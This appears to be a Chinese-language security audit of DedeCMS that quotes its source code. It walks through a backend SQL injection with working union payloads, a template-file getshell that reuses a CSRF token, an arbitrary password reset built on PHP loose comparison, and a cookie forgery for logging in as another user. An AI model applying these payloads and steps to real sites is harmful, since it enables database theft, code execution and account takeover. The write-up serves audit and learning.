## cms组成

在`include/common.inc.php`中有一个重要的功能是检查和注册外部提交的变量

但是`preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)`没有对`$_SERVER`和`$_FILE`进行检测

```php
function _RunMagicQuotes(&$svar)
{
    if (!get_magic_quotes_gpc()) {
        if (is_array($svar)) {
            foreach ($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);
        } else {
            if (strlen($svar) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $svar)) {
                exit('Request var not allow!');
            }
            $svar = addslashes($svar);
        }
    }
    return $svar;
}

if (!defined('DEDEREQUEST')) {
    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
    function CheckRequest(&$val)
    {
        if (is_array($val)) {
            foreach ($val as $_k => $_v) {
                if ($_k == 'nvarname') continue;
                CheckRequest($_k);
                CheckRequest($val[$_k]);
            }
        } else {
            if (strlen($val) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)) {
                exit('Request var not allow!');
            }
        }
    }

    //var_dump($_REQUEST);exit;
    CheckRequest($_REQUEST);
    CheckRequest($_COOKIE);

    foreach (array('_GET', '_POST', '_COOKIE') as $_request) {
        foreach ($$_request as $_k => $_v) {
            if ($_k == 'nvarname') ${$_k} = $_v;
            else ${$_k} = _RunMagicQuotes($_v);
        }
    }
}
```

同时dedecms在`include/dedesql.class.php`会对所有sql语句进行检查,检查函数如下

在`ExecuteNoneQuery`和`Execute`均进行了`CheckSql`检查,但是在`dede/config.php`将`$dsql->safeCheck`设置为`FALSE`

因此`CheckSql`仅作用于前台操作,后台操作不进行`CheckSql`,因此可能会产生后台sql注入

```php
function CheckSql($db_string, $querytype = 'select')
{
    global $cfg_cookie_encode;
    $clean = '';
    $error = '';
    $old_pos = 0;
    $pos = -1;
    $log_file = DEDEINC . '/../data/' . md5($cfg_cookie_encode) . '_safe.txt';
    $userIP = GetIP();
    $getUrl = GetCurUrl();

    //如果是普通查询语句，直接过滤一些特殊语法
    if ($querytype == 'select') {
        $notallow1 = "[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,}";

        //$notallow2 = "--|/\*";
        if (preg_match("/" . $notallow1 . "/i", $db_string)) {
            fputs(fopen($log_file, 'a+'), "$userIP||$getUrl||$db_string||SelectBreak\r\n");
            exit("<font size='5' color='red'>Safe Alert: Request Error step 1 !</font>");
        }
    }

    //完整的SQL检查
    while (TRUE) {
        $pos = strpos($db_string, '\'', $pos + 1);
        if ($pos === FALSE) {
            break;
        }
        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
        while (TRUE) {
            $pos1 = strpos($db_string, '\'', $pos + 1);
            $pos2 = strpos($db_string, '\\', $pos + 1);
            if ($pos1 === FALSE) {
                break;
            } elseif ($pos2 == FALSE || $pos2 > $pos1) {
                $pos = $pos1;
                break;
            }
            $pos = $pos2 + 1;
        }
        $clean .= '$s$';
        $old_pos = $pos + 1;
    }
    $clean .= substr($db_string, $old_pos);
    $clean = trim(strtolower(preg_replace(array('~\s+~s'), array(' '), $clean)));

    if (
        strpos($clean, '@') !== FALSE  or strpos($clean, 'char(') !== FALSE or strpos($clean, '"') !== FALSE
        or strpos($clean, '$s$$s$') !== FALSE
    ) {
        $fail = TRUE;
        if (preg_match("#^create table#i", $clean)) $fail = FALSE;
        $error = "unusual character";
    }

    //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它
    if (strpos($clean, 'union') !== FALSE && preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "union detect";
    }

    //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们
    elseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE) {
        $fail = TRUE;
        $error = "comment detect";
    }

    //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库
    elseif (strpos($clean, 'sleep') !== FALSE && preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "slown down detect";
    } elseif (strpos($clean, 'benchmark') !== FALSE && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "slown down detect";
    } elseif (strpos($clean, 'load_file') !== FALSE && preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "file fun detect";
    } elseif (strpos($clean, 'into outfile') !== FALSE && preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "file fun detect";
    }

    //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息
    elseif (preg_match('~\([^)]*?select~s', $clean) != 0) {
        $fail = TRUE;
        $error = "sub select detect";
    }
    if (!empty($fail)) {
        fputs(fopen($log_file, 'a+'), "$userIP||$getUrl||$db_string||$error\r\n");
        exit("<font size='5' color='red'>Safe Alert: Request Error step 2!</font>");
    } else {
        return $db_string;
    }
}
```

但要注意在`Execute`中有一个奇怪的判定

```php
if(!empty($this->result[$id]) && $this->result[$id]===FALSE)
{
    $this->DisplayError(mysql_error()." <br />Error sql: <font color='red'>".$this->queryString."</font>");
}
```

当`$this->result[$id]`为`FALSE`时,`empty($this->result[$id])`为`TRUE`,因此这个条件为永假,无法将报错回显...

[https://3v4l.org/ZaaHl](https://3v4l.org/ZaaHl)

```php
<?php

$result=array('a'=>FALSE);
$id='a';

var_dump($result);

var_dump(!empty($result[$id]) && $result[$id]===FALSE);
```

```
array(1) {
  ["a"]=>
  bool(false)
}
bool(false)
```

## dedecms存在后台sql注入

前面提到`dede/config.php`将`$dsql->safeCheck`设置为`FALSE`,因此在`dede`目录下对`.php`文件进行检索,检索内容为`$dsql->execute`,对返回的每一个文件进行审计

但要注意虽然没有进行`CheckSql`操作,但是在注册变量时仍然对变量进行了`addslashes`操作,因此目标应该主要放在没有使用单引号闭合的语句中

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091519010.png)

### article_description_main.php

```php
if(empty($startdd)) $startdd = 0;
if(empty($pagesize)) $pagesize = 100;
if(empty($totalnum)) $totalnum = 0;
if(empty($sid)) $sid = 0;
if(empty($eid)) $eid = 0;
if(empty($dojob)) $dojob = 'des';

$table = preg_replace("#[^0-9a-zA-Z_\#@]#", "", $table);
$field = preg_replace("#[^0-9a-zA-Z_\[\]]#", "", $field);
$channel = intval($channel);
if($dsize>250) $dsize = 250;
$tjnum = 0;

...

$fquery = "SELECT #@__archives.id,#@__archives.title,#@__archives.description,{$table}.{$field}
              FROM #@__archives LEFT JOIN {$table} ON {$table}.aid=#@__archives.id
              WHERE #@__archives.channel='{$channel}' $addquery LIMIT $startdd,$pagesize ; ";
$dsql->SetQuery($fquery);
$dsql->Execute();
while($row=$dsql->GetArray())
{
    $body = $row[$field];
    $description = $row['description'];
    if(strlen($description)>10 || $description=='-')
    {
        continue;
    }
    $bodytext = preg_replace("/#p#|#e#|副标题|分页标题/isU","",Html2Text($body));
    if(strlen($bodytext) < $msize)
    {
        continue;
    }
    $des = trim(addslashes(cn_substr($bodytext,$dsize)));
    if(strlen($des)<3)
    {
        $des = "-";
    }
    $dsql->ExecuteNoneQuery("UPDATE #@__archives SET description='{$des}' WHERE id='{$row['id']}';");
}
```

`$startdd`没有使用单引号进行闭合就拼接到语句中,由此造成了sql注入,利用前提是网站中要存在一篇文章

前面提到,这个`Execute`的报错判断为永假,因此无法进行报错注入,而这个联合查询是没有直接回显的,因此可以利用后面的`update`语句对文章的`description`的更新将数据回显出来,这里的`description`来源于`$body = $row[$field];`,因此要注意回显参数的位置

注意到`$fquery`中存在`{$table}.aid`,因此`$table`要存在`aid`列

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091626520.png)

结合上面的信息可以构造注入参数如下

```
dojob=des&totalnum=10&dsize=250&table=dede_addonarticle&field=aid&  startdd=0,1 union select 1,2,3,database()#
```

拼接得到的联合查询语句为

```
SELECT dede_archives.id,dede_archives.title,dede_archives.description,dede_addonarticle.aid              FROM dede_archives LEFT JOIN dede_addonarticle ON dede_addonarticle.aid=dede_archives.id              WHERE dede_archives.channel='0'  LIMIT 0,1 union select 1,2,3,database()#,100 ;
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091925187.png)

最终得到的`update`语句为

```
UPDATE dede_archives SET description='dedecms' WHERE id='1';
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091928779.png)

```
dojob=des&totalnum=10&dsize=250&table=dede_addonarticle&field=aid&  startdd=0,1 union select 1,2,3,group_concat(user(),version())#
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091931186.png)

同一文件中的`$dojob=='page'`貌似也存在注入,但是时间所限,没有去测试

### co_do.php

```php
else if($dopost=="clearct")
{
    CheckPurview('co_Del');
    if(!empty($ids))
    {
        $dsql->ExecuteNoneQuery("UPDATE `#@__co_htmls` SET isdown=0,result='' WHERE aid IN($ids) ");
    }
    ShowMsg("成功清除所有内容!",$ENV_GOBACK_URL);
    exit();
}
```

但是这里没有回显点,使用延迟注入,除了上述的两个注入点外,应该还有其他注入点,但是时间所限,没有去测试

## dede/tpl.php后台getshell

```php
else if ($action == 'upload')
{
    require_once(dirname(__FILE__).'/../include/oxwindow.class.php');
    $acdir = str_replace('.', '', $acdir);
    $win = new OxWindow();
    make_hash();
    $win->Init("tpl.php","js/blank.js","POST' enctype='multipart/form-data' ");
    $win->mainTitle = "模块管理";
    $wecome_info = "<a href='templets_main.php'>模板管理</a> &gt;&gt; 上传模板";
    $win->AddTitle('请选择要上传的文件:');
    $win->AddHidden("action",'uploadok');
    $msg = "
    <table width='600' border='0' cellspacing='0' cellpadding='0'>
  <tr>
    <td width='96' height='60'>请选择文件：</td>
    <td width='504'>
        <input name='acdir' type='hidden' value='$acdir'  />
        <input name='token' type='hidden' value='{$_SESSION['token']}'  />
        <input name='upfile' type='file' id='upfile' style='width:380px' />
      </td>
  </tr>
 </table>
    ";
    $win->AddMsgItem("<div style='padding-left:20px;line-height:150%'>$msg</div>");
    $winform = $win->GetWindow('ok','');
    $win->Display();
    exit();
}

...

else if($action=='savetagfile')
{
    csrf_check();
    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
    {
        ShowMsg('文件名不合法，不允许进行操作！', '-1');
        exit();
    }
    require_once(DEDEINC.'/oxwindow.class.php');
    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
    $content = stripslashes($content);
    $truefile = DEDEINC.'/taglib/'.$filename;
    $fp = fopen($truefile, 'w');
    fwrite($fp, $content);
    fclose($fp);
    $msg = "
    <form name='form1' action='tag_test_action.php' target='blank' method='post'>
      <input type='hidden' name='dopost' value='make' />
        <b>测试标签：</b>(需要使用环境变量的不能在此测试)<br/>
        <textarea name='partcode' cols='150' rows='6' style='width:90%;'>{dede:{$tagname} }{/dede:{$tagname}}</textarea><br />
        <input name='imageField1' type='image' class='np' src='images/button_ok.gif' width='60' height='22' border='0' />
    </form>
    ";
    $wintitle = "成功修改/创建文件！";
    $wecome_info = "<a href='templets_tagsource.php'>标签源码碎片管理</a> &gt;&gt; 修改/新建标签";
    $win = new OxWindow();
    $win->AddTitle("修改/新建标签：");
    $win->AddMsgItem($msg);
    $winform = $win->GetWindow("hand","&nbsp;",false);
    $win->Display();
    exit();
}
```

满足条件`$action=='savetagfile'`和`$filename=xxx.lib.php`即可,但要注意`csrf_check()`会对`token`进行检查

在前面可以看到`<input name='token' type='hidden' value='{$_SESSION['token']}'  />`被写到html中,利用这个token通过csrf检查

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203092111850.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203092114735.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203092114970.png)

## member/resetpassword.php存在任意用户重置密码漏洞

```php
if ($dopost == "") {
    include(dirname(__FILE__) . "/templets/resetpassword.htm");
} elseif ($dopost == "getpwd") {

    //验证验证码
    if (!isset($vdcode)) $vdcode = '';

    $svali = GetCkVdValue();
    if (strtolower($vdcode) != $svali || $svali == '') {
        ResetVdValue();
        ShowMsg("对不起，验证码输入错误！", "-1");
        exit();
    }

    //验证邮箱，用户名
    if (empty($mail) && empty($userid)) {
        showmsg('对不起，请输入用户名或邮箱', '-1');
        exit;
    } else if (!preg_match("#(.*)@(.*)\.(.*)#", $mail)) {
        showmsg('对不起，请输入正确的邮箱格式', '-1');
        exit;
    } else if (CheckUserID($userid, '', false) != 'ok') {
        ShowMsg("你输入的用户名 {$userid} 不合法！", "-1");
        exit();
    }
    $member = member($mail, $userid);

    //以邮件方式取回密码；
    if ($type == 1) {
        //判断系统邮件服务是否开启
        if ($cfg_sendmail_bysmtp == "Y") {
            sn($member['mid'], $userid, $member['email']);
        } else {
            showmsg('对不起邮件服务暂未开启，请联系管理员', 'login.php');
            exit();
        }

        //以安全问题取回密码；
    } else if ($type == 2) {
        if ($member['safequestion'] == 0) {
            showmsg('对不起您尚未设置安全密码，请通过邮件方式重设密码', 'login.php');
            exit;
        }
        require_once(dirname(__FILE__) . "/templets/resetpassword3.htm");
    }
    exit();
} else if ($dopost == "safequestion") {
    $mid = preg_replace("#[^0-9]#", "", $id);
    $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if (empty($safequestion)) $safequestion = '';

    if (empty($safeanswer)) $safeanswer = '';

    if ($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) {
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    } else {
        ShowMsg("对不起，您的安全问题或答案回答错误", "-1");
        exit();
    }
} else if ($dopost == "getpasswd") {
    //修改密码
    if (empty($id)) {
        ShowMsg("对不起，请不要非法提交", "login.php");
        exit();
    }
    $mid = preg_replace("#[^0-9]#", "", $id);
    $row = $db->GetOne("SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'");
    if (empty($row)) {
        ShowMsg("对不起，请不要非法提交", "login.php");
        exit();
    }
    if (empty($setp)) {
        $tptim = (60 * 60 * 24 * 3);
        $dtime = time();
        if ($dtime - $tptim > $row['mailtime']) {
            $db->executenonequery("DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';");
            ShowMsg("对不起，临时密码修改期限已过期", "login.php");
            exit();
        }
        require_once(dirname(__FILE__) . "/templets/resetpassword2.htm");
    } elseif ($setp == 2) {
        if (isset($key)) $pwdtmp = $key;

        $sn = md5(trim($pwdtmp));
        if ($row['pwd'] == $sn) {
            if ($pwd != "") {
                if ($pwd == $pwdok) {
                    $pwdok = md5($pwdok);
                    $sql = "DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';";
                    $db->executenonequery($sql);
                    $sql = "UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';";
                    if ($db->executenonequery($sql)) {
                        showmsg('更改密码成功，请牢记新密码', 'login.php');
                        exit;
                    }
                }
            }
            showmsg('对不起，新密码为空或填写不一致', '-1');
            exit;
        }
        showmsg('对不起，临时密码错误', '-1');
        exit;
    }
}
```

在`getpwd`这部分会对用户是否设置安全问题以及系统是否设置邮件服务进行检查,如果用户没有设置安全问题,则会要求通过邮件方式重设密码

但是重置密码这部分是通过`$dopost`来进行步骤的判断,因此可以通过传入不同的`$dopost`控制重置密码的步骤

可以直接传入`dopost=safequestion`来跳转到使用安全问题重置密码这一步骤,在这一步骤中,由于存在弱类型判断,因此可以进行任意用户密码重置

验证码发送条件`$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer`,`$row`的结果来源于数据库查询,而如果用户没有设置安全问题,则数据库查询`$row['safequestion']`返回`0`,而`$row['safeanswer']`返回`""`

但由于`if (empty($safequestion)) $safequestion = '';`和`if (empty($safeanswer)) $safeanswer = '';`的存在,直接对这两个参数传入`0`会被设置为`''`,因为`empty('0')`为`true`

因此`$safequestion`传入`00`,`$safeanswer`传入`0`然后被设置成`''`,即可满足发送条件

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203101904343.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203101905732.png)

```php
function newmail($mid, $userid, $mailto, $type, $send)
{
    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;
    $mailtime = time();
    $randval = random(8);
    $mailtitle = $cfg_webname.":密码修改";
    $mailto = $mailto;
    $headers = "From: ".$cfg_adminemail."\r\nReply-To: $cfg_adminemail";
    $mailbody = "亲爱的".$userid."：\r\n您好！感谢您使用".$cfg_webname."网。\r\n".$cfg_webname."应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：".$randval." 请于三天内登陆下面网址确认修改。\r\n".$cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid;
    if($type == 'INSERT')
    {
        $key = md5($randval);
        $sql = "INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');";
        if($db->ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
            } else if ($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
            }
        }
        else
        {
            return ShowMsg('对不起修改失败，请联系管理员', 'login.php');
        }
    }
    ...
}

function sn($mid,$userid,$mailto, $send = 'Y')
{
    global $db;
    $tptim= (60*10);
    $dtime = time();
    $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(!is_array($row))
    {
        //发送新邮件；
        newmail($mid,$userid,$mailto,'INSERT',$send);
    }

    ...
}
```

通过`ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);`获取到修改密码所需要的临时密钥,由此成功修改用户密码

利用这个漏洞的前提在于用户没有设置安全问题,同时cms在后台开放用户注册

成功获取到重置密码的连接`http://192.168.241.130:8080/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=uidu4wWp`

`md5(uidu4wWp,32) = c20251da46eb878f9c8d8333bac4e8e7`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203101910438.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203101914989.png)

`md5(123456,32) = e10adc3949ba59abbe56e057f20f883e`

## 存在前台cookie伪造漏洞

[参考文章 通过DedeCMS学习php代码审计](https://www.freebuf.com/articles/web/281747.html)

`include/helpers/cookie.helper.php`

```php
/**
 *  设置Cookie记录
 *
 * @param     string  $key    键
 * @param     string  $value  值
 * @param     string  $kptime  保持时间
 * @param     string  $pa     保存路径
 * @return    void
 */
if ( ! function_exists('PutCookie'))
{
    function PutCookie($key, $value, $kptime=0, $pa="/")
    {
        global $cfg_cookie_encode,$cfg_domain_cookie;
        setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
        setcookie($key.'__ckMd5', substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie);
    }
}

/**
 *  获取Cookie记录
 *
 * @param     $key   键名
 * @return    string
 */
if ( ! function_exists('GetCookie'))
{
    function GetCookie($key)
    {
        global $cfg_cookie_encode;
        if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) )
        {
            return '';
        }
        else
        {
            if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
            {
                return '';
            }
            else
            {
                return $_COOKIE[$key];
            }
        }
    }
}
```

`include/memberlogin.class.php`

```php
/**
 * 网站会员登录类
 *
 * @package          MemberLogin
 * @subpackage       DedeCMS.Libraries
 * @link             http://www.dedecms.com
 */
class MemberLogin
{
    var $M_ID;
    var $M_LoginID;
    var $M_MbType;
    var $M_Money;
    var $M_Scores;
    var $M_UserName;
    var $M_Rank;
    var $M_Face;
    var $M_LoginTime;
    var $M_KeepTime;
    var $M_Spacesta;
    var $fields;
    var $isAdmin;
    var $M_UpTime;
    var $M_ExpTime;
    var $M_HasDay;
    var $M_JoinTime;
    var $M_Honor = '';
    var $memberCache = 'memberlogin';

    //php5构造函数
    function __construct($kptime = -1, $cache = FALSE)
    {
        global $dsql;
        if ($kptime == -1) {
            $this->M_KeepTime = 3600 * 24 * 7;
        } else {
            $this->M_KeepTime = $kptime;
        }
        $formcache = FALSE;
        $this->M_ID = $this->GetNum(GetCookie("DedeUserID"));
        $this->M_LoginTime = GetCookie("DedeLoginTime");
        $this->fields = array();
        $this->isAdmin = FALSE;
        if (empty($this->M_ID)) {
            $this->ResetUser();
        } else {
            $this->M_ID = intval($this->M_ID);

...

/**
 *  验证用户是否已经登录
 *
 * @return    bool
 */
function IsLogin()
{
    if($this->M_ID > 0) return TRUE;
    else return FALSE;
}
```

`member/index.php`

```php
if($uid=='')
{
    $iscontrol = 'yes';
    if(!$cfg_ml->IsLogin())
    {
        include_once(dirname(__FILE__)."/templets/index-notlogin.htm");
    }
    else
    {
        $minfos = $dsql->GetOne("SELECT * FROM `#@__member_tj` WHERE mid='".$cfg_ml->M_ID."'; ");
        $minfos['totaluse'] = $cfg_ml->GetUserSpace();
        $minfos['totaluse'] = number_format($minfos['totaluse']/1024/1024,2);
        if($cfg_mb_max > 0) {
            $ddsize = ceil( ($minfos['totaluse']/$cfg_mb_max) * 100 );
        }
        else {
            $ddsize = 0;
        }

...

else
{
    require_once(DEDEMEMBER.'/inc/config_space.php');
    if($action == '')
    {
        ...

        //更新最近访客记录及站点统计记录
        $vtime = time();
        $last_vtime = GetCookie('last_vtime');
        $last_vid = GetCookie('last_vid');

        ...

        PutCookie('last_vtime', $vtime, 3600*24, '/');
        PutCookie('last_vid', $last_vid, 3600*24, '/');
```

cms通过`MemberLogin::IsLogin`来判断用户登录状态,使用`MemberLogin->M_ID`这一变量进行判定

`M_ID`来源于`$this->M_ID = $this->GetNum(GetCookie("DedeUserID"));`和`$this->M_ID = intval($this->M_ID);`

在`GetCookie`中会对`key`与`cfg_cookie_encode`进行拼接后的哈希值跟`key_ckmd5`进行比对,`cfg_cookie_encode`是在安装cms时随机生成的,无法修改或窃取

`GetCookie`后得到的`M_ID`通过`GetNum`和`intval`处理后转换为整数

在正常登录流程里面,`Cookie`中的`DedeUserID`为用户在数据库中的`id`是一个数值,如果我们可以将`DedeUserID`篡改为其他用户的id,那么就可以作为其他用户登录

如果我们在访问`member/index.php`添加了`uid`参数,那么cms会给我们返回对应`uid`与`cfg_cookie_encode`进行拼接后的哈希值`last_vid__ckmd5`,但这里的`uid`是用户名而非数据库中的`id`,如果传入的用户名在数据库中不存在,那么cms会返回一个值为`deleted`的`cookie`,因此不能直接利用

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203102133491.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203102134805.png)

但我们前面提到`GetCookie`后得到的`M_ID`通过`GetNum`和`intval`处理后转换为整数,假设我们注册了一个用户名为`1asdf`的用户,同时数据库中存在`id`为1的用户,我们通过`last_vid__ckmd5`获取到了`1asdf`的哈希值

我们将`DedeUserID`修改为`1asdf`,将`DedeUserID__ckmd5`修改为获得的`last_vid`的值,通过`function GetCookie($key)`显然是没有问题的,在返回`M_ID`时返回的是`1asdf`在经过`GetNum`和`intval`处理后被转换为了`1`,成功通过`islogin`的登录判断

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203102145174.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203102146331.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203102146012.png)